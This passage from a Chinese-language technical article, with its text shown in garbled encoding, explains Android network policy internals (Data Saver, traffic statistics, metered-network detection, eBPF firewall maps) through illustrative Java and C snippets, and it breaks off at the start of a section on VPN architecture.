        }

        <span class="hljs-comment">// 2. æ›´æ–°é˜²ç«å¢™è§„åˆ™</span>
        updateRulesForDataUsageRestrictionsUL(uid);

        <span class="hljs-comment">// 3. æŒä¹…åŒ–åˆ°ç£ç›˜</span>
        writePolicyAL();

        <span class="hljs-comment">// 4. é€šçŸ¥ç›‘å¬å™¨</span>
        mHandler.obtainMessage(MSG_POLICIES_CHANGED, uid, policy).sendToTarget();
    }

    <span class="hljs-comment">// æ ¸å¿ƒæ–¹æ³•2ï¼šæ›´æ–°é˜²ç«å¢™è§„åˆ™</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateRulesForDataUsageRestrictionsUL</span><span class="hljs-params">(<span class="hljs-type">int</span> uid)</span> {
        <span class="hljs-comment">// è®¡ç®—æœ€ç»ˆçš„ç½‘ç»œè§„åˆ™</span>
        <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">uidRules</span> <span class="hljs-operator">=</span> mUidRules.get(uid, RULE_NONE);
        <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">oldUidRules</span> <span class="hljs-operator">=</span> mUidRules.get(uid, RULE_NONE);

        <span class="hljs-comment">// è§„åˆ™æ”¹å˜æ‰æ›´æ–°</span>
        <span class="hljs-keyword">if</span> (uidRules == oldUidRules) <span class="hljs-keyword">return</span>;

        <span class="hljs-comment">// æ›´æ–°è§„åˆ™åˆ°Kernel</span>
        setUidFirewallRulesUL(FIREWALL_CHAIN_STANDBY, uid,
                              uidRules &amp; RULE_REJECT_METERED);
        setUidFirewallRulesUL(FIREWALL_CHAIN_DOZABLE, uid,
                              uidRules &amp; RULE_REJECT_ALL);
        setUidFirewallRulesUL(FIREWALL_CHAIN_POWERSAVE, uid,
                              uidRules &amp; RULE_REJECT_ALL);

        <span class="hljs-comment">// Android 15: ä½¿ç”¨eBPFä»£æ›¿iptables</span>
        <span class="hljs-keyword">if</span> (mUseBpfTrafficStats) {
            mBpfNetMaps.setUidRule(uid, uidRules);
        }
    }

    <span class="hljs-comment">// æ ¸å¿ƒæ–¹æ³•3ï¼šè®¾ç½®Data Saveræ¨¡å¼</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setRestrictBackground</span><span class="hljs-params">(<span class="hljs-type">boolean</span> restrictBackground)</span> {
        mContext.enforceCallingOrSelfPermission(MANAGE_NETWORK_POLICY, TAG);

        <span class="hljs-keyword">if</span> (mRestrictBackground == restrictBackground) <span class="hljs-keyword">return</span>;

        mRestrictBackground = restrictBackground;

        <span class="hljs-comment">// æ›´æ–°æ‰€æœ‰åº”ç”¨çš„ç½‘ç»œè§„åˆ™</span>
        updateRulesForRestrictBackgroundUL();

        <span class="hljs-comment">// é€šçŸ¥ç³»ç»ŸæœåŠ¡</span>
        mHandler.obtainMessage(MSG_RESTRICT_BACKGROUND_CHANGED,
                               restrictBackground ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>, <span class="hljs-number">0</span>).sendToTarget();
    }
}
</code></pre>
<h3 data-id="heading-7">1.2 Data Saverçœæµæ¨¡å¼è¯¦è§£</h3>
<p><strong>Data Saver</strong>æ˜¯Android 7.0å¼•å…¥çš„çœæµåŠŸèƒ½ï¼Œåœ¨Android 15ä¸­å¾—åˆ°äº†eBPFçš„æ€§èƒ½å¢å¼ºã€‚</p>
<h4 data-id="heading-8">å·¥ä½œåŸç†</h4>
<pre><code class="hljs language-markdown" lang="markdown">ç”¨æˆ·å¼€å¯Data Saverå:

<span class="hljs-bullet">1.</span> åå°åº”ç”¨ç½‘ç»œè¢«ç¦ç”¨
   â†’ é™¤éåº”ç”¨åœ¨ç™½åå•ä¸­

<span class="hljs-bullet">2.</span> å‰å°åº”ç”¨å¯ä»¥æ­£å¸¸è”ç½‘
   â†’ ä½†ä¼šæ”¶åˆ°DATA<span class="hljs-emphasis">_SAVER_</span>ENABLEDå›è°ƒ

<span class="hljs-bullet">3.</span> åº”ç”¨å¯ä»¥è¯·æ±‚ç™½åå•æƒé™
   â†’ POLICY<span class="hljs-emphasis">_ALLOW_</span>METERED<span class="hljs-emphasis">_BACKGROUND

4. ç³»ç»ŸæœåŠ¡ä¸å—å½±å“
   â†’ UID &lt; 10000çš„ç³»ç»Ÿè¿›ç¨‹è±å…
</span></code></pre>
<h4 data-id="heading-9">åº”ç”¨ç¤ºä¾‹</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åº”ç”¨å±‚ - æ£€æµ‹Data SaverçŠ¶æ€</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DataSaverChecker</span> {

    <span class="hljs-keyword">private</span> ConnectivityManager mCm;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkDataSaver</span><span class="hljs-params">(Context context)</span> {
        mCm = (ConnectivityManager) context.getSystemService(
            Context.CONNECTIVITY_SERVICE);

        <span class="hljs-comment">// 1. è·å–Data SaverçŠ¶æ€</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">status</span> <span class="hljs-operator">=</span> mCm.getRestrictBackgroundStatus();

        <span class="hljs-keyword">switch</span> (status) {
            <span class="hljs-keyword">case</span> RESTRICT_BACKGROUND_STATUS_DISABLED:
                <span class="hljs-comment">// Data Saverå…³é—­ï¼Œæ— é™åˆ¶</span>
                Log.d(TAG, <span class="hljs-string">"Data Saverå…³é—­"</span>);
                <span class="hljs-keyword">break</span>;

            <span class="hljs-keyword">case</span> RESTRICT_BACKGROUND_STATUS_ENABLED:
                <span class="hljs-comment">// Data Saverå¼€å¯ï¼Œåå°æ•°æ®è¢«ç¦ç”¨</span>
                Log.w(TAG, <span class="hljs-string">"Data Saverå¼€å¯ï¼Œåå°æ•°æ®å—é™"</span>);
                <span class="hljs-comment">// å»ºè®®ï¼šå»¶è¿Ÿéç´§æ€¥çš„ç½‘ç»œè¯·æ±‚</span>
                postponeNonUrgentRequests();
                <span class="hljs-keyword">break</span>;

            <span class="hljs-keyword">case</span> RESTRICT_BACKGROUND_STATUS_WHITELISTED:
                <span class="hljs-comment">// åº”ç”¨åœ¨ç™½åå•ä¸­ï¼Œä¸å—é™åˆ¶</span>
                Log.d(TAG, <span class="hljs-string">"åº”ç”¨åœ¨Data Saverç™½åå•"</span>);
                <span class="hljs-keyword">break</span>;
        }
    }

    <span class="hljs-comment">// 2. ç›‘å¬Data Saverå˜åŒ–</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerDataSaverListener</span><span class="hljs-params">(Context context)</span> {
        mCm.registerDefaultNetworkCallback(<span class="hljs-keyword">new</span> <span class="hljs-title class_">NetworkCallback</span>() {
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCapabilitiesChanged</span><span class="hljs-params">(Network network,
                                             NetworkCapabilities nc)</span> {
                <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æœ‰NOT_METEREDèƒ½åŠ›</span>
                <span class="hljs-type">boolean</span> <span class="hljs-variable">isMetered</span> <span class="hljs-operator">=</span> !nc.hasCapability(
                    NET_CAPABILITY_NOT_METERED);

                <span class="hljs-keyword">if</span> (isMetered &amp;&amp; isDataSaverEnabled()) {
                    <span class="hljs-comment">// åœ¨æŒ‰æµé‡è®¡è´¹ç½‘ç»œ + Data Saverå¼€å¯</span>
                    showDataSaverWarning();
                }
            }
        });
    }

    <span class="hljs-comment">// 3. åº”ç”¨ä¼˜åŒ–å»ºè®®</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">optimizeForDataSaver</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (isDataSaverEnabled()) {
            <span class="hljs-comment">// å‡å°‘é¢„åŠ è½½</span>
            disablePrefetching();

            <span class="hljs-comment">// é™ä½å›¾ç‰‡è´¨é‡</span>
            setImageQuality(QUALITY_LOW);

            <span class="hljs-comment">// ç¦ç”¨è‡ªåŠ¨æ’­æ”¾è§†é¢‘</span>
            disableAutoplayVideos();

            <span class="hljs-comment">// å»¶è¿Ÿå¤§æ–‡ä»¶ä¸‹è½½</span>
            pauseLargeDownloads();
        }
    }
}
</code></pre>
<h4 data-id="heading-10">Frameworkå±‚å®ç°</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// NetworkPolicyManagerService.java</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateRulesForRestrictBackgroundUL</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// éå†æ‰€æœ‰UID</span>
    <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> mUidPolicy.size();
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; size; i++) {
        <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">uid</span> <span class="hljs-operator">=</span> mUidPolicy.keyAt(i);
        <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">policy</span> <span class="hljs-operator">=</span> mUidPolicy.valueAt(i);

        <span class="hljs-comment">// è®¡ç®—è§„åˆ™</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">uidRules</span> <span class="hljs-operator">=</span> RULE_NONE;
        <span class="hljs-keyword">if</span> (mRestrictBackground) {
            <span class="hljs-comment">// Data Saverå¼€å¯</span>
            <span class="hljs-keyword">if</span> (!hasWhitelistExemption(policy)) {
                <span class="hljs-comment">// ä¸åœ¨ç™½åå•ï¼Œç¦æ­¢åå°æ•°æ®</span>
                uidRules |= RULE_REJECT_METERED;
            }
        }

        <span class="hljs-comment">// åº”ç”¨è§„åˆ™</span>
        setUidFirewallRule(FIREWALL_CHAIN_STANDBY, uid, uidRules);
    }
}

<span class="hljs-comment">// æ£€æŸ¥ç™½åå•</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">hasWhitelistExemption</span><span class="hljs-params">(<span class="hljs-type">int</span> policy)</span> {
    <span class="hljs-comment">// å…è®¸æŒ‰æµé‡è®¡è´¹ç½‘ç»œçš„åå°æ•°æ®</span>
    <span class="hljs-keyword">return</span> (policy &amp; POLICY_ALLOW_METERED_BACKGROUND) != <span class="hljs-number">0</span>;
}
</code></pre>
<h3 data-id="heading-11">1.3 æµé‡ç»Ÿè®¡NetworkStatsService</h3>
<p><strong>æ ¸å¿ƒåŠŸèƒ½</strong>ï¼šå®æ—¶ç»Ÿè®¡åº”ç”¨å’Œç½‘ç»œæ¥å£çš„æµé‡æ•°æ®ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// packages/modules/Connectivity/.../NetworkStatsService.java</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NetworkStatsService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">INetworkStatsService</span>.Stub {

    <span class="hljs-comment">// UIDç»´åº¦ç»Ÿè®¡</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> NetworkStatsRecorder mUidRecorder;

    <span class="hljs-comment">// Interfaceç»´åº¦ç»Ÿè®¡</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> NetworkStatsRecorder mUidTagRecorder;

    <span class="hljs-comment">// æ ¸å¿ƒæ–¹æ³•ï¼šè·å–UIDæµé‡ç»Ÿè®¡</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> NetworkStats <span class="hljs-title function_">getUidStats</span><span class="hljs-params">(<span class="hljs-type">int</span> uid, NetworkTemplate template)</span> {
        <span class="hljs-comment">// 1. ä»BPFè¯»å–ç»Ÿè®¡æ•°æ® (Android 15)</span>
        <span class="hljs-type">NetworkStats</span> <span class="hljs-variable">stats</span> <span class="hljs-operator">=</span> mBpfNetMaps.readStatsForUid(uid);

        <span class="hljs-comment">// 2. åˆå¹¶å†å²æ•°æ®</span>
        stats.combineWith(mUidRecorder.getOrLoadHistoryFor(uid, template));

        <span class="hljs-comment">// 3. è¿”å›ç»“æœ</span>
        <span class="hljs-keyword">return</span> stats;
    }

    <span class="hljs-comment">// è½®è¯¢æ›´æ–°ç»Ÿè®¡æ•°æ®</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">performPoll</span><span class="hljs-params">(<span class="hljs-type">int</span> flags)</span> {
        <span class="hljs-comment">// 1. ä»Kernelè¯»å–æœ€æ–°æ•°æ®</span>
        <span class="hljs-keyword">final</span> <span class="hljs-type">NetworkStats</span> <span class="hljs-variable">xtSnapshot</span> <span class="hljs-operator">=</span> readNetworkStatsUidDetail(UID_ALL);

        <span class="hljs-comment">// 2. è®¡ç®—å¢é‡</span>
        <span class="hljs-keyword">final</span> <span class="hljs-type">NetworkStats</span> <span class="hljs-variable">delta</span> <span class="hljs-operator">=</span> xtSnapshot.subtract(mLastStatsSnapshot);
        mLastStatsSnapshot = xtSnapshot;

        <span class="hljs-comment">// 3. è®°å½•åˆ°å†å²</span>
        mUidRecorder.recordSnapshotLocked(delta, System.currentTimeMillis());

        <span class="hljs-comment">// 4. æ£€æŸ¥æµé‡é…é¢</span>
        mPolicyListener.onStatsUpdated(delta);
    }
}
</code></pre>
<h4 data-id="heading-12">åº”ç”¨å±‚ä½¿ç”¨TrafficStats</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æŸ¥è¯¢åº”ç”¨æµé‡</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TrafficStatsExample</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">showAppTraffic</span><span class="hljs-params">(<span class="hljs-type">int</span> uid)</span> {
        <span class="hljs-comment">// 1. è·å–æ¥æ”¶å­—èŠ‚æ•°</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">rxBytes</span> <span class="hljs-operator">=</span> TrafficStats.getUidRxBytes(uid);

        <span class="hljs-comment">// 2. è·å–å‘é€å­—èŠ‚æ•°</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">txBytes</span> <span class="hljs-operator">=</span> TrafficStats.getUidTxBytes(uid);

        <span class="hljs-comment">// 3. è·å–æ¥æ”¶æ•°æ®åŒ…æ•°</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">rxPackets</span> <span class="hljs-operator">=</span> TrafficStats.getUidRxPackets(uid);

        <span class="hljs-comment">// 4. è·å–å‘é€æ•°æ®åŒ…æ•°</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">txPackets</span> <span class="hljs-operator">=</span> TrafficStats.getUidTxPackets(uid);

        Log.d(TAG, String.format(
            <span class="hljs-string">"UID %d: RX=%s TX=%s"</span>,
            uid,
            humanReadableByteCount(rxBytes),
            humanReadableByteCount(txBytes)
        ));
    }

    <span class="hljs-comment">// æ ‡è®°Socket (ç”¨äºç»†ç²’åº¦ç»Ÿè®¡)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">tagSocket</span><span class="hljs-params">(Socket socket, <span class="hljs-type">int</span> tag)</span> {
        <span class="hljs-comment">// è®¾ç½®çº¿ç¨‹çš„æµé‡æ ‡ç­¾</span>
        TrafficStats.setThreadStatsTag(tag);

        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// æ ‡è®°Socket</span>
            TrafficStats.tagSocket(socket);

            <span class="hljs-comment">// è¿›è¡Œç½‘ç»œæ“ä½œ...</span>
            socket.connect(address);

        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-comment">// å–æ¶ˆæ ‡ç­¾</span>
            TrafficStats.untagSocket(socket);
            TrafficStats.clearThreadStatsTag();
        }
    }

    <span class="hljs-comment">// æ ¼å¼åŒ–æµé‡æ˜¾ç¤º</span>
    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">humanReadableByteCount</span><span class="hljs-params">(<span class="hljs-type">long</span> bytes)</span> {
        <span class="hljs-keyword">if</span> (bytes &lt; <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> bytes + <span class="hljs-string">" B"</span>;
        <span class="hljs-type">int</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) (Math.log(bytes) / Math.log(<span class="hljs-number">1024</span>));
        <span class="hljs-type">char</span> <span class="hljs-variable">pre</span> <span class="hljs-operator">=</span> <span class="hljs-string">"KMGTPE"</span>.charAt(exp - <span class="hljs-number">1</span>);
        <span class="hljs-keyword">return</span> String.format(<span class="hljs-string">"%.1f %sB"</span>,
                           bytes / Math.pow(<span class="hljs-number">1024</span>, exp), pre);
    }
}
</code></pre>
<h3 data-id="heading-13">1.4 æŒ‰æµé‡è®¡è´¹ç½‘ç»œè¯†åˆ«</h3>
<p>Androidéœ€è¦è¯†åˆ«å“ªäº›ç½‘ç»œæ˜¯<strong>æŒ‰æµé‡è®¡è´¹</strong>çš„ï¼ˆMetered Networkï¼‰ï¼Œä»¥ä¾¿åº”ç”¨ä¼˜åŒ–è¡Œä¸ºã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// NetworkCapabilitiesä¸­çš„èƒ½åŠ›æ ‡è¯†</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NetworkCapabilities</span> {
    <span class="hljs-comment">// éè®¡è´¹ç½‘ç»œï¼ˆå¦‚å®¶åº­WiFiï¼‰</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">NET_CAPABILITY_NOT_METERED</span> <span class="hljs-operator">=</span> <span class="hljs-number">11</span>;

    <span class="hljs-comment">// ä¸´æ—¶éè®¡è´¹ï¼ˆå¦‚è¿è¥å•†å…è´¹æµé‡ï¼‰</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">NET_CAPABILITY_TEMPORARILY_NOT_METERED</span> <span class="hljs-operator">=</span> <span class="hljs-number">25</span>;
}
</code></pre>
<h4 data-id="heading-14">è¯†åˆ«é€»è¾‘</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ConnectivityService.java</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateMeteredStatus</span><span class="hljs-params">(NetworkAgentInfo nai)</span> {
    <span class="hljs-type">NetworkCapabilities</span> <span class="hljs-variable">nc</span> <span class="hljs-operator">=</span> nai.networkCapabilities;

    <span class="hljs-comment">// 1. WiFié»˜è®¤éè®¡è´¹</span>
    <span class="hljs-keyword">if</span> (nc.hasTransport(TRANSPORT_WIFI)) {
        nc.addCapability(NET_CAPABILITY_NOT_METERED);
    }

    <span class="hljs-comment">// 2. ç§»åŠ¨ç½‘ç»œé»˜è®¤è®¡è´¹</span>
    <span class="hljs-keyword">if</span> (nc.hasTransport(TRANSPORT_CELLULAR)) {
        nc.removeCapability(NET_CAPABILITY_NOT_METERED);
    }

    <span class="hljs-comment">// 3. ä½†å¯ä»¥è¢«é…ç½®è¦†ç›–</span>
    <span class="hljs-keyword">if</span> (mNetworkPolicies.isNetworkMetered(nai)) {
        nc.removeCapability(NET_CAPABILITY_NOT_METERED);
    }
}
</code></pre>
<h4 data-id="heading-15">åº”ç”¨æ£€æŸ¥ç¤ºä¾‹</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isCurrentNetworkMetered</span><span class="hljs-params">(Context context)</span> {
    <span class="hljs-type">ConnectivityManager</span> <span class="hljs-variable">cm</span> <span class="hljs-operator">=</span> (ConnectivityManager)
        context.getSystemService(Context.CONNECTIVITY_SERVICE);

    <span class="hljs-comment">// 1. è·å–å½“å‰ç½‘ç»œ</span>
    <span class="hljs-type">Network</span> <span class="hljs-variable">network</span> <span class="hljs-operator">=</span> cm.getActiveNetwork();
    <span class="hljs-keyword">if</span> (network == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// å®‰å…¨èµ·è§ï¼Œå‡è®¾è®¡è´¹</span>

    <span class="hljs-comment">// 2. è·å–èƒ½åŠ›</span>
    <span class="hljs-type">NetworkCapabilities</span> <span class="hljs-variable">capabilities</span> <span class="hljs-operator">=</span> cm.getNetworkCapabilities(network);
    <span class="hljs-keyword">if</span> (capabilities == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;

    <span class="hljs-comment">// 3. æ£€æŸ¥æ˜¯å¦éè®¡è´¹</span>
    <span class="hljs-keyword">return</span> !capabilities.hasCapability(NET_CAPABILITY_NOT_METERED);
}
</code></pre>
<h3 data-id="heading-16">1.5 Android 15æ–°ç‰¹æ€§ï¼šeBPFç½‘ç»œç­–ç•¥</h3>
<p>Android 15ä½¿ç”¨**eBPF (extended Berkeley Packet Filter)**æ›¿ä»£ä¼ ç»Ÿçš„iptablesï¼Œæ€§èƒ½æå‡æ˜¾è‘—ã€‚</p>
<h4 data-id="heading-17">eBPF vs iptableså¯¹æ¯”</h4>



































<table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">iptables</th><th align="left">eBPF (Android 15)</th></tr></thead><tbody><tr><td align="left">è§„åˆ™åŒ¹é…</td><td align="left">çº¿æ€§æ‰«æ O(n)</td><td align="left">å“ˆå¸ŒæŸ¥æ‰¾ O(1)</td></tr><tr><td align="left">å»¶è¿Ÿ</td><td align="left">~100Î¼s</td><td align="left">~10Î¼s</td></tr><tr><td align="left">å†…æ ¸æ€åˆ‡æ¢</td><td align="left">éœ€è¦</td><td align="left">ä¸éœ€è¦</td></tr><tr><td align="left">åŠ¨æ€æ›´æ–°</td><td align="left">é”å…¨è¡¨</td><td align="left">æ— é”æ›´æ–°</td></tr><tr><td align="left">CPUå ç”¨</td><td align="left">é«˜</td><td align="left">ä½</td></tr></tbody></table>
<h4 data-id="heading-18">eBPFå®ç°åŸç†</h4>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// system/netd/bpf_progs/netd.c</span>

<span class="hljs-comment">// BPFç¨‹åº - UIDæµé‡æ§åˆ¶</span>
SEC(<span class="hljs-string">"cgroupskb/ingress/stats"</span>)
<span class="hljs-type">int</span> <span class="hljs-title function_">bpf_traffic_account</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> __sk_buff *skb)</span> {
    <span class="hljs-comment">// 1. è·å–UID</span>
    <span class="hljs-type">uint32_t</span> uid = bpf_get_socket_uid(skb);

    <span class="hljs-comment">// 2. æŸ¥è¯¢UIDè§„åˆ™</span>
    <span class="hljs-type">uint8_t</span> *rule = bpf_uid_permission_map_lookup_elem(&amp;uid);

    <span class="hljs-comment">// 3. æ£€æŸ¥æƒé™</span>
    <span class="hljs-keyword">if</span> (rule &amp;&amp; (*rule &amp; BPF_PERMISSION_INTERNET) == <span class="hljs-number">0</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// æ‹’ç»ï¼šä¸¢å¼ƒæ•°æ®åŒ…</span>
    }

    <span class="hljs-comment">// 4. ç»Ÿè®¡æµé‡</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stats_value</span> *<span class="hljs-title">value</span> =</span> bpf_uid_stats_map_lookup_elem(&amp;uid);
    <span class="hljs-keyword">if</span> (value) {
        __sync_fetch_and_add(&amp;value-&gt;rxBytes, skb-&gt;len);
        __sync_fetch_and_add(&amp;value-&gt;rxPackets, <span class="hljs-number">1</span>);
    }

    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;  <span class="hljs-comment">// å…è®¸ï¼šç»§ç»­ä¼ è¾“</span>
}

<span class="hljs-comment">// BPF Map - UIDæƒé™è¡¨</span>
<span class="hljs-class"><span class="hljs-keyword">struct</span> {</span>
    __uint(type, BPF_MAP_TYPE_HASH);
    __type(key, <span class="hljs-type">uint32_t</span>);    <span class="hljs-comment">// UID</span>
    __type(value, <span class="hljs-type">uint8_t</span>);   <span class="hljs-comment">// æƒé™æ ‡å¿—</span>
    __uint(max_entries, <span class="hljs-number">10000</span>);
} uid_permission_map <span class="hljs-title function_">SEC</span><span class="hljs-params">(<span class="hljs-string">".maps"</span>)</span>;

<span class="hljs-comment">// BPF Map - UIDæµé‡ç»Ÿè®¡</span>
<span class="hljs-class"><span class="hljs-keyword">struct</span> {</span>
    __uint(type, BPF_MAP_TYPE_HASH);
    __type(key, <span class="hljs-type">uint32_t</span>);    <span class="hljs-comment">// UID</span>
    __type(value, <span class="hljs-keyword">struct</span> stats_value);
    __uint(max_entries, <span class="hljs-number">10000</span>);
} uid_stats_map <span class="hljs-title function_">SEC</span><span class="hljs-params">(<span class="hljs-string">".maps"</span>)</span>;
</code></pre>
<h4 data-id="heading-19">Javaå±‚æ¥å£</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// frameworks/base/.../BpfNetMaps.java</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BpfNetMaps</span> {

    <span class="hljs-comment">// è®¾ç½®UIDç½‘ç»œè§„åˆ™</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUidRule</span><span class="hljs-params">(<span class="hljs-type">int</span> uid, <span class="hljs-type">int</span> rule)</span> {
        <span class="hljs-comment">// ç›´æ¥æ›´æ–°BPF Map</span>
        mUidPermissionMap.updateEntry(
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">UidPermissionKey</span>(uid),
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">UidPermissionValue</span>(rule)
        );
    }

    <span class="hljs-comment">// è¯»å–UIDæµé‡ç»Ÿè®¡</span>
    <span class="hljs-keyword">public</span> NetworkStats <span class="hljs-title function_">readStatsForUid</span><span class="hljs-params">(<span class="hljs-type">int</span> uid)</span> {
        <span class="hljs-type">UidStatsValue</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> mUidStatsMap.getValue(
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">UidStatsKey</span>(uid)
        );

        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NetworkStats</span>.Entry(
            <span class="hljs-literal">null</span>, uid,
            SET_DEFAULT, TAG_NONE,
            METERED_NO, ROAMING_NO,
            DEFAULT_NETWORK_NO,
            value.rxBytes, value.rxPackets,
            value.txBytes, value.txPackets,
            <span class="hljs-number">0</span> <span class="hljs-comment">/* operations */</span>
        );
    }
}
</code></pre>
<p><strong>æ€§èƒ½æå‡</strong>ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">æµ‹è¯•åœºæ™¯: 1000ä¸ªåº”ç”¨åŒæ—¶è”ç½‘

iptablesæ–¹å¼:
  - è§„åˆ™åŒ¹é…æ—¶é—´: 1000 * 100Î¼<span class="hljs-attr">s</span> = <span class="hljs-number">100</span>ms
  - CPUå ç”¨: 15%

eBPFæ–¹å¼:
  - è§„åˆ™åŒ¹é…æ—¶é—´: 1000 * 10Î¼<span class="hljs-attr">s</span> = <span class="hljs-number">10</span>ms
  - CPUå ç”¨: 3%

æ€§èƒ½æå‡: 10å€å»¶è¿Ÿé™ä½ï¼Œ5å€CPUå‡å°‘
</code></pre>
<hr/>
<h2 data-id="heading-20">äºŒã€VPNæ¡†æ¶æ·±åº¦è§£æ</h2>
<h3 data-id="heading-21">2.1 VpnServiceæ¶æ„æ€»è§ˆ</h3>
<p><strong>VPN (Virtual Private Network)</strong> è™šæ‹Ÿä¸“ç”¨ç½‘ç»œï¼Œåœ¨Androidä¸­é€šè¿‡<code>VpnService</code>æ¡†æ¶å®ç°ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a47ab27f9a0a462fb4d05f9536092add~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770382913&amp;x-signature=oXivoQ02D3TSS5kHTUN4SKcVF0Q%3D" alt="08-02-vpn-workflow.png" loading="lazy"/></p>
<h4 data-id="heading-22">æ ¸å¿ƒç»„ä»¶</h4>
<pre><code class="hljs language-bash" lang="bash">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚          Android VPNæ¶æ„                 â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                         â”‚
â”‚  åº”ç”¨å±‚                                  â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                     â”‚
â”‚  â”‚  VpnService    â”‚ â† åº”ç”¨ç»§æ‰¿å®ç°      â”‚
â”‚  â”‚  (æŠ½è±¡åŸºç±»)     â”‚                     â”‚
